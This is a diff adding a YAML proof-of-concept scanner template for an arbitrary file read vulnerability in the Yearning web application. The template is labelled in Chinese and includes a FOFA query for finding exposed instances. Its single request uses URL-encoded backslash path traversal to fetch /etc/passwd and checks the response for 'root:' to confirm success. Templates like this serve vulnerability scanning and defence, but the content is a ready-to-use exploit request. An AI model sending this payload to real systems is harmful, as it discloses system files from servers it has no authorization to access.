@@ -1,0 +1,15 @@
+id: poc-yaml-yearning-front-anyfile-read
+info:
+  name: Yearning front 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Yearning
+  fofa: app="Yearning"
+requests:
+- method: GET
+  path: /front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
